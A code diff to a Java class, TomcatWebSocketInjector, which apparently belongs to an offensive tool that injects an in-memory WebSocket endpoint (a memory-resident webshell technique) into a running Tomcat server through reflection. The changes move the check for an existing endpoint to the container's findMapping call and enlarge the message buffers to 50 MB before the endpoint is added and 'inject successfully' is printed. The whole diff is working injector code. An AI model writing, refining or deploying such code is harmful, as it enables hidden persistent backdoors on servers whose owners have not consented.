@@ -88,6 +88,12 @@ public class TomcatWebSocketInjector {
         if (container == null) {
             return;
         }
+
+        if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
+            System.out.println("websocket at " + getUrlPattern() + " already exists");
+            return;
+        }
+
         ClassLoader classLoader = context.getClass().getClassLoader();
         Class<?> serverEndpointConfigClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
         Class<?> builderClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
@@ -96,11 +102,8 @@ public class TomcatWebSocketInjector {
         Object o1 = constructor.newInstance(obj.getClass(), getUrlPattern());
         Object endpointConfig = invokeMethod(o1, "build", null, null);
 
-        Map<String, Object> o = (Map<String, Object>) getFieldValue(container, "configExactMatchMap");
-        if (o.containsKey(getUrlPattern())) {
-            System.out.println("websocket at " + getUrlPattern() + " already exists");
-            return;
-        }
+        invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
+        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
         invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
         System.out.println("websocket at " + getUrlPattern() + " inject successfully");
     }
